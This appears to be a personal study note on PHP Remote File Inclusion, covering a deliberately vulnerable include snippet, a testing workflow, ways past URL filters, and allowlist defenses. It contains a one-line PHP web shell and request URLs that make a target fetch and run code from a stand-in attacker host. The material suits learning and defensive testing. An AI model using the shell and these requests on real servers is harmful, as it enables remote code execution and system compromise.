#webapplications

OWASP A05 (Injection) — an extension of [[Local File Inclusion]]. The server fetches a file from a remote URL (attacker-controlled) and includes it as PHP. The attacker hosts malicious code; the server executes it locally.

## How it works
```php
// Vulnerable
include $_GET['template'];  // includes whatever URL you supply
```

The server runs code like:
```php
include 'http://attacker.com/malicious.txt';
```
The remote file is fetched, then included and executed **on the target server** — not in your browser. The attacker's code runs with the target server's privileges.

## Testing workflow
1. **Identify an include parameter** — anywhere a filename/URL could be included (template selector, config loader, plugin system)
   ```
   /page?template=header
   /admin?config=settings
   /render?layout=default
   ```

2. **Test with a remote URL** — host a simple PHP/text file on your server and see if the app fetches it:
   ```
   /page?template=http://attacker.com/test.txt
   # Or:
   /page?template=http://attacker.com/test.php
   ```

3. **Observe the response** — if it contains your file's content or shows its output, RFI is confirmed. 
   - Success: Response includes your file's content
   - Blocked: 403 or file-not-found
   - Wrong format: The URL wasn't fetched (maybe it only accepts local paths)

4. **Escalate to code execution** — once confirmed, host PHP that executes commands:
   ```php
   <?php system($_GET['cmd']); ?>
   ```
   Then: `/page?template=http://attacker.com/shell.php&cmd=id`

## Common gotchas

| Gotcha | What goes wrong | How to detect |
| --- | --- | --- |
| URL validation blocks `http://` | The app checks for `http:` and rejects it | Try `ftp://`, `file://`, or protocol wrappers |
| Only `.php` files execute | You send `.txt` and it's not executed | Change extension to `.php` or check if the server executes on inclusion |
| The URL is fetched but not included | You see a 404 or error message | The file exists but isn't being treated as code; try different MIME types |
| Server has no outbound internet | Your URL isn't reachable | Test with a local IP or `localhost:port` if the server can reach it |
| Firewall blocks your IP | 403 or timeout when server tries to fetch | Use a public server (attacker.com) or VPN with a different IP |

## Differences from LFI

| Attack | File location | What the server does | Risk |
| --- | --- | --- | --- |
| **LFI** | On the target server already | Reads and includes it | Information disclosure, limited to local execution context |
| **RFI** | On attacker's server | Fetches from remote, then includes it | Full code execution (attacker controls the code) |

RFI is more powerful because the attacker isn't constrained to existing files — they write the malicious code and have it executed.

## Defenses
```php
# Allowlist approach — safest
$allowed = [
    'header' => 'templates/header.php',
    'footer' => 'templates/footer.php'
];
$template = $allowed[$_GET['template']] ?? null;
if (!$template) die('Not found');
include $template;

# If arbitrary URLs must be allowed:
# - Validate the URL is in a whitelist of domains
# - Disable remote URL inclusion in php.ini (allow_url_include = Off)
# - Never include user input as a URL directly
```
